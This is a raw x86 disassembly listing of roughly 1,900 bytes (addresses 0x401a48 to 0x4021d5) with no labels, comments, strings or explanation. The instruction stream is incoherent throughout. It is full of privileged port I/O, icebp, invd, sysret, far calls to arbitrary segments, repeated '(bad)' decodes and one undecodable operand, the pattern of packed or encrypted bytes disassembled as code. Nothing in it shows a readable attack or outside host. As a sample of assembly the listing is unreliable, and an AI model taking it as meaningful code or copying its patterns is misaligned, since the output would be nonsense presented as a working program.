  401a48:	mov    esi,DWORD PTR [eax+0x28]
  401a4b:	ins    BYTE PTR es:[edi],dx
  401a4c:	lods   eax,DWORD PTR ds:[esi]
  401a4d:	push   edx
  401a4e:	mov    ecx,0x4d98b790
  401a53:	div    BYTE PTR [ebp-0x19]
  401a56:	jns    0x401a6a
  401a58:	mov    esi,0x527cef69
  401a5d:	and    al,BYTE PTR [edx]
  401a5f:	cld    
  401a60:	loopne 0x401a61
  401a62:	nop
  401a63:	or     BYTE PTR [eax],al
  401a65:	mov    al,ds:0xa0741e2
  401a6a:	and    ebp,DWORD PTR [edx+0x4f]
  401a6d:	cmp    BYTE PTR [ebp-0x6438bdec],bl
  401a73:	sbb    esp,DWORD PTR [esi+0x44]
  401a76:	out    0xbf,eax
  401a78:	sbb    edi,DWORD PTR [eax-0x44092f43]
  401a7e:	push   0xddcc879c
  401a83:	dec    esp
  401a84:	test   al,0x13
  401a86:	cmp    DWORD PTR [ebx-0x1bdfb80c],edi
  401a8c:	sbb    al,0x93
  401a8e:	pop    edi
  401a8f:	stos   BYTE PTR es:[edi],al
  401a90:	out    dx,eax
  401a91:	sub    ebx,DWORD PTR [ebx]
  401a93:	icebp  
  401a94:	loope  0x401a89
  401a96:	and    eax,0x78a9d26a
  401a9b:	mov    al,ds:0x205f174d
  401aa0:	call   0xf792c8da
  401aa5:	xlat   BYTE PTR ds:[ebx]
  401aa6:	mov    ebx,0x1c1c6c48
  401aab:	loop   0x401a3e
  401aad:	mov    edi,0x159ef454
  401ab2:	sbb    BYTE PTR [esi-0x21],dl
  401ab5:	fadd   DWORD PTR [edx-0x356406ba]
  401abb:	mov    dh,bl
  401abd:	or     dl,BYTE PTR [edx-0x5a1ff8e2]
  401ac3:	popf   
  401ac4:	jecxz  0x401aff
  401ac6:	pushf  
  401ac7:	icebp  
  401ac8:	or     ebp,DWORD PTR [ebx]
  401aca:	pop    ss
  401acb:	dec    ebp
  401acc:	adc    ecx,esi
  401ace:	mov    ah,0x86
  401ad0:	je     0x401a55
  401ad2:	je     0x401b03
  401ad4:	push   edx
  401ad5:	mov    ds:0x2711550b,al
  401ada:	cmp    ch,dl
  401adc:	or     BYTE PTR [ecx],dh
  401ade:	addr16 daa 
  401ae0:	sub    eax,0xa8136ff8
  401ae5:	mov    cl,0x46
  401ae7:	pop    es
  401ae8:	inc    ecx
  401ae9:	jne    0x401ae4
  401aeb:	adc    eax,0x7f2aeb96
  401af0:	mov    ch,0xc7
  401af2:	sbb    al,0xc0
  401af4:	fdiv   DWORD PTR [esi-0x4b]
  401af7:	push   es
  401af8:	lahf   
  401af9:	ret    
  401afa:	xlat   BYTE PTR ds:[ebx]
  401afb:	cmp    eax,0x1d2e8fb4
  401b00:	xchg   esi,eax
  401b01:	jnp    0x401b5c
  401b03:	mov    BYTE PTR [esi+0x6a3812a0],ah
  401b09:	fcom   QWORD PTR [eax-0x1536ee75]
  401b0f:	xchg   edi,eax
  401b10:	mov    eax,0x72192d14
  401b15:	test   al,0xc6
  401b17:	push   eax
  401b18:	sahf   
  401b19:	push   ebp
  401b1a:	ror    BYTE PTR [esp+eax*4],0x8f
  401b1e:	mov    dh,0xa9
  401b20:	jbe    0x401adf
  401b22:	int3   
  401b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b24:	aam    0x61
  401b26:	fmul   DWORD PTR [ebx+0x6]
  401b29:	pusha  
  401b2a:	out    dx,eax
  401b2b:	arpl   WORD PTR [ebp-0x3c3ce7bd],bp
  401b31:	mov    cl,0xe1
  401b33:	imul   ecx
  401b35:	push   ds
  401b36:	xchg   edx,eax
  401b37:	dec    ebx
  401b38:	shr    BYTE PTR [ebx+0x59defc5c],0x4c
  401b3f:	xlat   BYTE PTR ds:[ebx]
  401b40:	jl     0x401bb0
  401b42:	adc    esi,ecx
  401b44:	pop    esp
  401b45:	pop    esp
  401b46:	fnsetpm(287 only) 
  401b48:	adc    al,0xd3
  401b4a:	push   ss
  401b4b:	mov    DWORD PTR [edi],ecx
  401b4d:	cmp    ah,0x88
  401b50:	stc    
  401b51:	dec    esp
  401b52:	cmp    al,0xa1
  401b54:	in     al,0x5c
  401b56:	je     0x401b67
  401b58:	std    
  401b59:	fild   QWORD PTR [edi-0x584b01c6]
  401b5f:	inc    ebx
  401b60:	shl    DWORD PTR [ecx-0x20],cl
  401b63:	test   BYTE PTR [edi+0x6a],cl
  401b66:	adc    BYTE PTR [esi+edx*1-0x28],ah
  401b6a:	jno    0x401bbe
  401b6c:	xlat   BYTE PTR ds:[ebx]
  401b6d:	pop    ebx
  401b6e:	mov    ah,0x7
  401b70:	sub    al,0x88
  401b72:	test   al,0x34
  401b74:	ds stc 
  401b76:	and    BYTE PTR ds:0xa645f698,al
  401b7c:	xor    al,0xdf
  401b7e:	sahf   
  401b7f:	adc    al,0xba
  401b81:	test   al,0xa4
  401b83:	fimul  WORD PTR [edi]
  401b85:	cmp    eax,0xdbe6db94
  401b8a:	inc    edi
  401b8b:	inc    edx
  401b8c:	sub    BYTE PTR [ebx+0xa],al
  401b8f:	shl    BYTE PTR [ebx],1
  401b91:	addr16 xchg ebx,ebp
  401b94:	sub    DWORD PTR [di-0xb45],ebx
  401b99:	mov    ch,0xe
  401b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b9c:	sti    
  401b9d:	mov    eax,ds:0x4420c4d4
  401ba2:	fst    QWORD PTR [edi+0xd]
  401ba5:	inc    esi
  401ba6:	aaa    
  401ba7:	jl     0x401b66
  401ba9:	out    0x47,al
  401bab:	dec    edx
  401bac:	or     DWORD PTR [ecx+0x3a5d5d3f],edx
  401bb2:	adc    bl,BYTE PTR [ebx+0x1e]
  401bb5:	rcr    BYTE PTR [ebx+0x2e],1
  401bb8:	in     eax,dx
  401bb9:	dec    ebp
  401bba:	mov    esp,ebp
  401bbc:	sub    cl,BYTE PTR [esi]
  401bbe:	ss inc esi
  401bc0:	pop    edi
  401bc1:	lea    esi,[edx-0x6133a1f4]
  401bc7:	lea    eax,[edi+edx*1]
  401bca:	add    dh,BYTE PTR [edi-0x1be42de4]
  401bd0:	int    0x68
  401bd2:	sbb    ebx,DWORD PTR [ebx]
  401bd4:	scas   eax,DWORD PTR es:[edi]
  401bd5:	or     ebp,DWORD PTR [ebx-0x48ee388f]
  401bdb:	xchg   ecx,eax
  401bdc:	mov    edx,DWORD PTR [ecx-0x1b]
  401bdf:	in     eax,0x14
  401be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401be2:	fisubr DWORD PTR [eax+esi*1+0x2]
  401be6:	inc    esi
  401be7:	xchg   ebp,eax
  401be8:	mov    esp,0xea666f1d
  401bed:	sub    ebx,DWORD PTR [edx+0x7f68b1d]
  401bf3:	cmp    al,0xfd
  401bf5:	dec    BYTE PTR [esi+0x6b41549]
  401bfb:	push   cs
  401bfc:	or     al,0xbe
  401bfe:	out    0x9c,eax
  401c00:	xchg   ebx,eax
  401c01:	mov    edx,0xd01b5575
  401c06:	popa   
  401c07:	sbb    ebx,ecx
  401c09:	test   eax,0xa31157d5
  401c0e:	cmc    
  401c0f:	sbb    dl,dh
  401c11:	inc    ecx
  401c12:	js     0x401bcc
  401c14:	jnp    0x401ba2
  401c16:	inc    ecx
  401c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c18:	pop    edx
  401c19:	jb     0x401c2a
  401c1b:	jo     0x401c06
  401c1d:	call   DWORD PTR [eax+esi*4]
  401c20:	dec    ebx
  401c21:	addr16 cdq 
  401c23:	inc    esi
  401c24:	gs dec ebp
  401c26:	mov    bl,0xfa
  401c28:	xor    BYTE PTR [ebp-0x3b],0x7d
  401c2c:	and    BYTE PTR [ecx],ch
  401c2e:	or     eax,0x25caf76c
  401c33:	lds    edi,FWORD PTR [edi+0x39]
  401c36:	sub    bl,BYTE PTR [edx+0x3b48355d]
  401c3c:	mov    dl,0xc6
  401c3e:	inc    ecx
  401c3f:	push   edx
  401c40:	and    al,BYTE PTR [ecx]
  401c42:	retf   0xc4c1
  401c45:	int3   
  401c46:	popf   
  401c47:	fdivr  DWORD PTR [eax+0x23]
  401c4a:	pop    ecx
  401c4b:	adc    BYTE PTR [esi-0x36],bl
  401c4e:	(bad)  
  401c4f:	das    
  401c50:	in     eax,dx
  401c51:	pop    ss
  401c52:	or     eax,0x3e7f3812
  401c57:	dec    ebx
  401c58:	stos   DWORD PTR es:[edi],eax
  401c59:	push   ds
  401c5a:	pusha  
  401c5b:	cmp    eax,0xf5481012
  401c60:	pop    ss
  401c61:	add    DWORD PTR [edi-0x1a92d34f],edx
  401c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c68:	icebp  
  401c69:	pop    edi
  401c6a:	sbb    BYTE PTR [edi-0x1d4b9e2e],ch
  401c70:	stos   DWORD PTR es:[edi],eax
  401c71:	ss jg  0x401c77
  401c74:	into   
  401c75:	int    0x3d
  401c77:	nop
  401c78:	pop    edi
  401c79:	xchg   esi,eax
  401c7a:	aam    0x57
  401c7c:	test   eax,0xce3b29ba
  401c81:	dec    edi
  401c82:	mov    al,ds:0x96c72d0d
  401c87:	push   ebx
  401c88:	or     eax,0xccaab2de
  401c8d:	cmp    al,0xbd
  401c8f:	inc    eax
  401c90:	adc    esp,ecx
  401c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c93:	inc    esi
  401c94:	sub    BYTE PTR [esp+eax*2],ch
  401c97:	sub    ebx,DWORD PTR [edx+0x2873d0e8]
  401c9d:	jle    0x401ce9
  401c9f:	xchg   ecx,eax
  401ca0:	fwait
  401ca1:	mov    ah,0x87
  401ca3:	(bad)  
  401ca4:	xor    DWORD PTR [ebx-0x1a],esp
  401ca7:	cdq    
  401ca8:	adc    WORD PTR [edx+0x68472b02],bx
  401caf:	fidiv  DWORD PTR [edx-0x31]
  401cb2:	xlat   BYTE PTR ds:[bx]
  401cb4:	fldcw  WORD PTR [edx+0x3a]
  401cb7:	in     eax,dx
  401cb8:	push   cs
  401cb9:	inc    DWORD PTR [eax]
  401cbb:	sub    edi,DWORD PTR [edx-0x7fcfa930]
  401cc1:	or     DWORD PTR [edi],esp
  401cc3:	fisub  DWORD PTR [edx+0x37]
  401cc6:	out    dx,eax
  401cc7:	inc    eax
  401cc8:	cli    
  401cc9:	inc    ebp
  401cca:	loop   0x401d39
  401ccc:	jmp    0x401c6c
  401cce:	lock jns 0x401d0c
  401cd1:	lods   eax,DWORD PTR ds:[esi]
  401cd2:	mov    esp,0x6add988a
  401cd7:	ss aas 
  401cd9:	push   0x1b
  401cdb:	adc    eax,0xb3fde588
  401ce0:	outs   dx,DWORD PTR ds:[esi]
  401ce1:	pop    esp
  401ce2:	add    dl,BYTE PTR [edi]
  401ce4:	add    eax,0xc71ff4e1
  401ce9:	(bad)  
  401cea:	loopne 0x401c8f
  401cec:	in     eax,0xec
  401cee:	aas    
  401cef:	mov    ebx,0x510a4d99
  401cf4:	cld    
  401cf5:	call   0xdc55:0xf7655bc4
  401cfc:	xchg   edx,eax
  401cfd:	cmp    al,0xac
  401cff:	cmp    al,0xf1
  401d01:	push   ecx
  401d02:	sub    DWORD PTR [eax-0x50],edi
  401d05:	mov    al,0x10
  401d07:	repnz rol DWORD PTR [ecx-0x16],cl
  401d0b:	push   cs
  401d0c:	dec    ebp
  401d0d:	push   ecx
  401d0e:	xor    DWORD PTR [ecx+0x52],edi
  401d11:	shl    BYTE PTR [ebx],cl
  401d13:	mov    ch,0x32
  401d15:	mov    al,ds:0xb80628c
  401d1a:	push   ss
  401d1b:	loope  0x401cb9
  401d1d:	scas   eax,DWORD PTR es:[edi]
  401d1e:	xchg   esp,eax
  401d1f:	(bad)  
  401d20:	push   ebp
  401d21:	inc    ecx
  401d22:	mov    edx,0x68c21369
  401d27:	xchg   dh,ah
  401d29:	xchg   edi,eax
  401d2a:	fsub   DWORD PTR [ebx]
  401d2c:	out    dx,eax
  401d2d:	xchg   ah,bl
  401d2f:	shl    esp,0xfe
  401d32:	(bad)  
  401d33:	scas   al,BYTE PTR es:[edi]
  401d34:	jno    0x401d7d
  401d36:	sub    ebp,DWORD PTR [edi]
  401d38:	les    edi,FWORD PTR [esi-0x3f6c0f22]
  401d3e:	rep ins DWORD PTR es:[edi],dx
  401d40:	fcomp  DWORD PTR [edx+0x1437be57]
  401d46:	mov    ah,0xe3
  401d48:	popf   
  401d49:	clc    
  401d4a:	add    al,0x8
  401d4c:	sbb    dh,BYTE PTR [esi]
  401d4e:	add    BYTE PTR [edx+0x4],cl
  401d51:	pop    es
  401d52:	mov    ds:0x65d36868,eax
  401d57:	dec    ebp
  401d58:	repnz dec ebp
  401d5a:	aas    
  401d5b:	mov    ds:0xe574c97e,eax
  401d60:	cmp    DWORD PTR [ecx],edx
  401d62:	mov    ebp,0xe534148c
  401d67:	dec    si
  401d69:	cmp    eax,0xeef5929c
  401d6e:	or     al,BYTE PTR [esp]
  401d71:	cld    
  401d72:	dec    esi
  401d73:	push   edx
  401d74:	mov    bl,0x91
  401d76:	sub    BYTE PTR [edi-0xd733071],dl
  401d7c:	adc    BYTE PTR [ecx+ebp*8+0x22343da2],dh
  401d83:	lods   eax,DWORD PTR ds:[esi]
  401d84:	push   ds
  401d85:	je     0x401d34
  401d87:	adc    al,0xbd
  401d89:	mov    DWORD PTR ds:0x4268f078,ebp
  401d8f:	xor    al,0x30
  401d91:	dec    ecx
  401d92:	imul   ebx,DWORD PTR [ebp+0x1a843258],0x8c19f577
  401d9c:	call   0x2857:0x4c77f5e7
  401da3:	lea    edi,[ebp-0x17]
  401da6:	sub    eax,0x85e98752
  401dab:	hlt    
  401dac:	jnp    0x401dd7
  401dae:	cli    
  401daf:	xor    BYTE PTR [ebx],0x51
  401db2:	and    al,0x8e
  401db4:	nop
  401db5:	xor    ebp,DWORD PTR [edi+0x5c3db89f]
  401dbb:	mov    ds:0x1fa0031c,eax
  401dc0:	aas    
  401dc1:	fs cmp eax,0xdd1e15e2
  401dc7:	pop    esi
  401dc8:	pop    ecx
  401dc9:	inc    esi
  401dca:	mov    esp,0x7df22eb7
  401dcf:	mov    ds:0x5ccb8c29,eax
  401dd4:	(bad)  
  401dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dd6:	outs   dx,DWORD PTR ds:[esi]
  401dd7:	aas    
  401dd8:	mov    ds:0xe2faa19b,al
  401ddd:	int3   
  401dde:	jne    0x401dc6
  401de0:	jns    0x401e4e
  401de2:	rol    DWORD PTR [ebx+0x77],cl
  401de5:	push   esi
  401de6:	aad    0xe3
  401de8:	adc    al,0x7d
  401dea:	popa   
  401deb:	xchg   esp,eax
  401dec:	jp     0x401d81
  401dee:	shl    bh,1
  401df0:	stos   BYTE PTR es:[edi],al
  401df1:	push   esp
  401df2:	adc    al,0xd6
  401df4:	std    
  401df5:	mov    ds:0xef0c3e27,eax
  401dfa:	es jp  0x401da7
  401dfd:	sub    DWORD PTR [eax-0x4e],0xffffffd8
  401e01:	fsubr  DWORD PTR [edx-0x3c1490c4]
  401e07:	std    
  401e08:	fwait
  401e09:	mov    ?,eax
  401e0b:	dec    eax
  401e0c:	push   edi
  401e0d:	inc    ebp
  401e0e:	enter  0x3d2b,0xfa
  401e12:	jle    0x401e16
  401e14:	stos   BYTE PTR es:[edi],al
  401e15:	call   0x2cef:0xe647b598
  401e1c:	out    dx,eax
  401e1d:	inc    esi
  401e1e:	mov    eax,ds:0x5a16916b
  401e23:	inc    ebp
  401e24:	in     al,0xa0
  401e26:	sahf   
  401e27:	lods   eax,DWORD PTR ds:[esi]
  401e28:	stos   DWORD PTR es:[edi],eax
  401e29:	push   ebp
  401e2a:	sbb    al,BYTE PTR [eax+0x47b0b72c]
  401e30:	sbb    DWORD PTR [edi-0x61ff5b4f],esp
  401e36:	mov    BYTE PTR [esi],cl
  401e38:	mov    edx,0x94604e2e
  401e3d:	or     BYTE PTR [ecx-0x61e27168],0x9e
  401e44:	ret    
  401e45:	mov    es,WORD PTR [ebx]
  401e47:	push   edi
  401e48:	pop    edx
  401e49:	jle    0x401e74
  401e4b:	(bad)  
  401e4c:	push   ebx
  401e4d:	push   0xf
  401e4f:	dec    ebp
  401e50:	or     eax,0x134657a6
  401e55:	push   es
  401e56:	das    
  401e57:	mov    ds:0xd0dc813f,al
  401e5c:	gs ds adc al,0x63
  401e60:	jle    0x401ead
  401e62:	scas   al,BYTE PTR es:[edi]
  401e63:	mov    al,0xe6
  401e65:	dec    ebp
  401e66:	jnp    0x401ea0
  401e68:	mov    ch,0xc
  401e6a:	push   esp
  401e6b:	and    al,BYTE PTR [ecx+ebx*4+0x5e]
  401e6f:	xchg   ebp,eax
  401e70:	cmp    bl,dl
  401e72:	fistp  QWORD PTR [eax]
  401e74:	hlt    
  401e75:	pop    eax
  401e76:	out    dx,eax
  401e77:	xor    bl,ch
  401e79:	cld    
  401e7a:	push   0x19bcf450
  401e7f:	inc    eax
  401e80:	div    BYTE PTR [esi+0x1cf64bde]
  401e86:	jns    0x401e6b
  401e88:	xchg   edx,eax
  401e89:	ins    BYTE PTR es:[edi],dx
  401e8a:	mov    esp,0xf570fc94
  401e8f:	(bad)  
  401e91:	dec    eax
  401e92:	mov    DWORD PTR [ebx+edi*2-0x7f],ecx
  401e96:	jg     0x401e4e
  401e98:	test   eax,0x66a2f341
  401e9d:	(bad)  
  401e9e:	imul   DWORD PTR [edx]
  401ea0:	(bad)  
  401ea2:	clc    
  401ea3:	cmp    bh,al
  401ea5:	leave  
  401ea6:	sub    edi,ecx
  401ea8:	cmp    DWORD PTR [eax],0x34
  401eab:	push   ss
  401eac:	ins    BYTE PTR es:[edi],dx
  401ead:	pop    esp
  401eae:	inc    edi
  401eaf:	mov    cl,BYTE PTR [edx+ebp*2+0x3e]
  401eb3:	fsubr  st(5),st
  401eb5:	mov    dh,0xb3
  401eb7:	sbb    eax,0xf6b691ed
  401ebc:	dec    edx
  401ebd:	add    al,0x33
  401ebf:	lahf   
  401ec0:	adc    eax,0x4b6b7ad6
  401ec5:	push   0x2f9dea87
  401eca:	mov    esp,DWORD PTR [ecx+0x338e1849]
  401ed0:	in     eax,0x93
  401ed2:	and    BYTE PTR [ecx+eiz*8+0x12],0x1d
  401ed7:	cli    
  401ed8:	jle    0x401f44
  401eda:	jns    0x401e5f
  401edc:	xchg   esp,eax
  401edd:	loop   0x401f4f
  401edf:	cmp    al,0x8a
  401ee1:	push   0x185fdbba
  401ee6:	aad    0xf1
  401ee8:	jmp    0x401f17
  401eea:	inc    ebp
  401eeb:	out    dx,eax
  401eec:	jp     0x401f3b
  401eee:	mov    ebp,0x5fe8e41b
  401ef3:	or     ah,cl
  401ef5:	sub    DWORD PTR [edi],ecx
  401ef7:	jns    0x401eb4
  401ef9:	mov    ecx,0xbc39c966
  401efe:	stc    
  401eff:	mov    ss,WORD PTR [ecx-0x43]
  401f02:	inc    esi
  401f03:	lods   al,BYTE PTR ds:[esi]
  401f04:	sti    
  401f05:	pop    eax
  401f06:	xchg   edx,eax
  401f07:	enter  0xc936,0x1d
  401f0b:	xchg   DWORD PTR [esi],ebp
  401f0d:	xchg   ebp,eax
  401f0e:	push   edi
  401f0f:	xlat   BYTE PTR ds:[ebx]
  401f10:	addr16 dec edi
  401f12:	jb     0x401e9d
  401f14:	inc    esp
  401f15:	or     cl,cl
  401f17:	xchg   edx,eax
  401f18:	sub    eax,0x7744d59b
  401f1d:	cmp    eax,0x93c0b797
  401f22:	loop   0x401ede
  401f24:	xlat   BYTE PTR ds:[ebx]
  401f25:	xor    BYTE PTR [ebx*2+0x6896a806],al
  401f2c:	loopne 0x401f51
  401f2e:	loope  0x401f1f
  401f30:	mov    gs,WORD PTR [ebx]
  401f32:	mov    ecx,0x746d6c74
  401f37:	cmp    eax,0x2097d7d9
  401f3c:	es dec edi
  401f3e:	add    DWORD PTR [edx+0x60],eax
  401f41:	sti    
  401f42:	repz inc esp
  401f44:	inc    eax
  401f45:	push   0x53f52c1
  401f4a:	xchg   ebp,eax
  401f4b:	add    dh,BYTE PTR [ebp-0x10]
  401f4e:	inc    ebp
  401f4f:	out    dx,eax
  401f50:	call   0xe479:0xcf0c74c1
  401f57:	add    al,0xc
  401f59:	lds    esi,FWORD PTR [ebx-0x12]
  401f5c:	jecxz  0x401f4e
  401f5e:	dec    esi
  401f5f:	inc    eax
  401f60:	pop    ds
  401f61:	cmp    al,0xcf
  401f63:	or     BYTE PTR [esp+edi*1+0x6],0xd2
  401f68:	fisubr WORD PTR [edi-0x80]
  401f6b:	mov    ebp,0x328b55fa
  401f70:	fsubr  DWORD PTR [edx+0x43]
  401f73:	lea    edx,[edi+0x1c62782d]
  401f79:	xor    bl,BYTE PTR [edi-0x3f09e310]
  401f7f:	fwait
  401f80:	adc    ebp,DWORD PTR [eax-0x573fb341]
  401f86:	jno    0x401f40
  401f88:	jl     0x401f7d
  401f8a:	in     al,dx
  401f8b:	test   al,0x1
  401f8d:	mov    bh,0x3a
  401f8f:	push   esp
  401f90:	push   cs
  401f91:	xchg   esi,eax
  401f92:	pop    esi
  401f93:	mov    bh,0xeb
  401f95:	iret   
  401f96:	inc    ebx
  401f97:	cwde   
  401f98:	jne    0x401f42
  401f9a:	dec    esi
  401f9b:	and    ecx,DWORD PTR [edi+edx*1-0x79c04a38]
  401fa2:	mov    ebp,eax
  401fa4:	mov    DWORD PTR [edi-0x57],ebp
  401fa7:	xor    edi,DWORD PTR [eax+edx*4]
  401faa:	xchg   ebp,eax
  401fab:	call   0x5816:0xae5ab90b
  401fb2:	jecxz  0x401ff2
  401fb4:	mov    WORD PTR [edx],gs
  401fb6:	rcl    BYTE PTR [ecx-0x7d],cl
  401fb9:	out    dx,al
  401fba:	xchg   al,dl
  401fbc:	in     eax,0x68
  401fbe:	popf   
  401fbf:	test   al,0xf5
  401fc1:	push   edi
  401fc2:	aad    0x55
  401fc4:	xchg   edi,eax
  401fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fc6:	xchg   ebx,eax
  401fc7:	mov    ds,WORD PTR [edi-0x72]
  401fca:	repz je 0x402036
  401fcd:	retf   
  401fce:	jp     0x401f9b
  401fd0:	mov    ecx,0xe12e870e
  401fd5:	jg     0x40204b
  401fd7:	stos   DWORD PTR es:[edi],eax
  401fd8:	fs (bad) 
  401fda:	push   cs
  401fdb:	push   edi
  401fdc:	jns    0x40200d
  401fde:	pop    esp
  401fdf:	mov    DWORD PTR [ecx],ecx
  401fe1:	neg    BYTE PTR [esp+ebp*1+0x75]
  401fe5:	and    edi,DWORD PTR [ebp-0x367303f6]
  401feb:	popf   
  401fec:	test   BYTE PTR [edx-0x12],al
  401fef:	es mov bh,ch
  401ff2:	pop    ss
  401ff3:	xchg   ebp,eax
  401ff4:	xor    eax,DWORD PTR [ecx+0x12]
  401ff7:	jae    0x401fb7
  401ff9:	dec    eax
  401ffa:	and    ebx,eax
  401ffc:	fucom  st(3)
  401ffe:	cld    
  401fff:	imul   eax,DWORD PTR [eax-0x6179e2bc],0x68
  402006:	add    DWORD PTR fs:[ecx],ebp
  402009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200a:	(bad)  
  40200b:	lahf   
  40200c:	lds    ecx,FWORD PTR ds:0xdede2588
  402012:	jl     0x402083
  402014:	mov    DWORD PTR [esi],edi
  402016:	ds stc 
  402018:	ret    
  402019:	loopne 0x402037
  40201b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40201c:	mov    edx,ebx
  40201e:	inc    esi
  40201f:	retf   0x9b58
  402022:	xchg   edx,eax
  402023:	or     al,0x39
  402025:	sti    
  402026:	nop
  402027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402028:	sar    DWORD PTR [esp+edx*2-0x36ba481a],cl
  40202f:	psubsb mm6,QWORD PTR [ecx-0x499813e5]
  402036:	pop    esi
  402037:	xchg   edx,eax
  402038:	mov    eax,ds:0x9192d50
  40203d:	in     al,0x46
  40203f:	lods   eax,DWORD PTR ds:[esi]
  402040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402041:	int3   
  402042:	addr16 fwait
  402044:	adc    eax,0x3da37640
  402049:	xor    eax,0xec4f4f15
  40204e:	(bad)  [edi+0xc]
  402051:	nop
  402052:	js     0x401ff2
  402054:	xor    dl,BYTE PTR [edx+0x7b]
  402057:	fyl2x  
  402059:	arpl   WORD PTR [ecx+esi*8],sp
  40205c:	leave  
  40205d:	push   0x3009e34c
  402062:	invd   
  402064:	jno    0x40205b
  402066:	ins    BYTE PTR es:[edi],dx
  402067:	xchg   ebp,eax
  402068:	(bad)  
  402069:	cdq    
  40206a:	xor    DWORD PTR [edx],esi
  40206c:	push   0x26
  40206e:	fcmovu st,st(0)
  402070:	cli    
  402071:	addr16 jmp 0x4a5b:0xe4021e8a
  402079:	pop    edx
  40207a:	add    eax,0x36c94d9d
  40207f:	xchg   DWORD PTR [eax-0x64],ebx
  402082:	or     DWORD PTR [esi+0x43],0xea1ceb79
  402089:	inc    esp
  40208a:	pop    edi
  40208b:	and    al,0x38
  40208d:	push   ss
  40208e:	push   cs
  40208f:	enter  0xcbc8,0x71
  402093:	sbb    al,0x89
  402095:	test   eax,0xea3bb473
  40209a:	pop    es
  40209b:	cli    
  40209c:	daa    
  40209d:	mov    ds:0x7e0d6528,al
  4020a2:	aad    0xa
  4020a4:	push   0xffffffe7
  4020a6:	adc    DWORD PTR [ecx+0x44],0xffffff88
  4020aa:	jmp    0xaf02236c
  4020af:	mov    dl,0x6c
  4020b1:	xor    BYTE PTR [edx+0x32],ah
  4020b4:	fst    QWORD PTR [ebx+ebx*4+0x377bbc22]
  4020bb:	rcr    BYTE PTR [esi],cl
  4020bd:	sbb    BYTE PTR [edx-0x39507a09],dl
  4020c3:	in     al,dx
  4020c4:	lahf   
  4020c5:	(bad)  
  4020c7:	cmp    al,0xf5
  4020c9:	sbb    ebp,DWORD PTR [ecx+0x4eb63794]
  4020cf:	lock retf 
  4020d1:	and    cl,BYTE PTR [edi-0x66]
  4020d4:	xor    ebx,DWORD PTR [edx]
  4020d6:	mov    bl,0x16
  4020d8:	dec    edi
  4020d9:	loope  0x4020f8
  4020db:	mov    al,0x22
  4020dd:	in     eax,0x8d
  4020df:	clc    
  4020e0:	add    eax,0x4add125c
  4020e5:	out    0x62,al
  4020e7:	rol    DWORD PTR [ebx],1
  4020e9:	stos   BYTE PTR es:[edi],al
  4020ea:	scas   al,BYTE PTR es:[edi]
  4020eb:	mov    si,0xe920
  4020ef:	pop    esi
  4020f0:	and    ah,dh
  4020f2:	push   ebp
  4020f3:	mov    al,0xdb
  4020f5:	jp     0x402149
  4020f7:	xchg   BYTE PTR ds:[ebp-0xcc3cbc3],bl
  4020fe:	test   DWORD PTR [edx],0x95f4d038
  402104:	and    DWORD PTR ds:0x7b13871e,esi
  40210a:	pop    esp
  40210b:	gs jb  0x4020a5
  40210e:	adc    BYTE PTR [esi+0x68323f1c],dh
  402114:	sysret 
  402116:	loop   0x4020d2
  402118:	dec    ebp
  402119:	mov    al,0xa9
  40211b:	daa    
  40211c:	adc    esp,edi
  40211e:	inc    eax
  40211f:	sbb    al,0x1d
  402121:	test   al,0x2b
  402123:	popf   
  402124:	ds gs stos BYTE PTR es:[edi],al
  402127:	or     al,0xbf
  402129:	in     al,dx
  40212a:	pop    es
  40212b:	stos   BYTE PTR es:[edi],al
  40212c:	call   FWORD PTR [ecx]
  40212e:	xor    DWORD PTR [ebx-0x40dba2fc],esi
  402134:	pop    ebp
  402135:	jb     0x4021a7
  402137:	imul   ebx,DWORD PTR [eax+0x7f240bff],0x6f
  40213e:	outs   dx,DWORD PTR ds:[esi]
  40213f:	inc    eax
  402140:	nop
  402141:	iret   
  402142:	adc    eax,0x55e157c2
  402147:	shr    bl,1
  402149:	push   0xc
  40214b:	jl     0x4021a5
  40214d:	enter  0xaf6f,0x1b
  402151:	repnz xchg edx,eax
  402153:	shl    DWORD PTR [edx],0x1f
  402156:	fs mov eax,ebp
  402159:	test   ebx,ebp
  40215b:	or     edx,DWORD PTR [edi-0x309c54c0]
  402161:	jecxz  0x402127
  402163:	loope  0x4020ff
  402165:	addr16 sbb eax,0xaa172625
  40216b:	repnz mov eax,ds:0xafd716e0
  402171:	ds leave 
  402173:	mov    esp,0xe5fd780b
  402178:	dec    ecx
  402179:	jbe    0x402120
  40217b:	and    BYTE PTR gs:[edi+0x1c159386],bl
  402182:	outs   dx,DWORD PTR ds:[esi]
  402183:	(bad)  
  402184:	pop    ebp
  402185:	aam    0x99
  402187:	jmp    0x32b22d99
  40218c:	(bad)  
  40218d:	addr16 jno 0x4021c6
  402190:	xchg   edx,eax
  402191:	retf   
  402192:	aas    
  402193:	in     eax,0xb0
  402195:	stc    
  402196:	mov    bl,0xd2
  402198:	pop    ebp
  402199:	jl     0x4021f8
  40219b:	fadd   QWORD PTR ds:0xd4e183ad
  4021a1:	pop    eax
  4021a2:	mov    BYTE PTR [edi],bh
  4021a4:	inc    esi
  4021a5:	jmp    0x1dd0:0x6b356de3
  4021ac:	mov    WORD PTR [eax-0x73e0133b],ss
  4021b2:	div    DWORD PTR [edi+edx*4]
  4021b5:	add    eax,0x99bfdf58
  4021bb:	int    0x56
  4021bd:	mov    esp,0x60d539f0
  4021c2:	jno    0x402224
  4021c4:	ins    DWORD PTR es:[edi],dx
  4021c5:	mov    ecx,0xf379bc80
  4021ca:	inc    edx
  4021cb:	(bad)  [eax-0x27]
  4021ce:	stos   BYTE PTR es:[edi],al
  4021cf:	mov    ebx,es
  4021d1:	dec    ebx
  4021d2:	test   al,0xa4
  4021d4:	retf   
  4021d5:	mov    DWORD PTR [ecx+0x59],esi
